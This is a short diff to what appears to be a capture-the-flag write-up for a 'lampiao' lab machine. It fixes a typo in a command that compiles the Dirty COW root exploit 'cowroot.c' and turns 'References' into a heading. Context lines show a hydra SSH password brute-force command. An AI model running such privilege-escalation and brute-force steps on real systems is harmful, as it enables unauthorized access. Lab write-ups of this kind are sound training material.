@@ -430,7 +430,7 @@ Saving to: 'cowroot.c'
 ```
 
 ```console
-www-data@lampiao:/tmp$ gcc cowroot.c -o cowroo -pthread
+www-data@lampiao:/tmp$ gcc cowroot.c -o cowroot -pthread
 cowroot.c: In function 'procselfmemThread':
 cowroot.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
          lseek(f,map,SEEK_SET);
@@ -510,7 +510,7 @@ hydra -L usernames.txt -P cewl.txt -o hydra.txt -e nsr -f -t 4 ssh://192.168.49.
 ```
 
 
-References
+### References
 
 https://fengweiz.github.io/19fa-cs315/slides/lab9-slides-dirty-cow.pdf
 
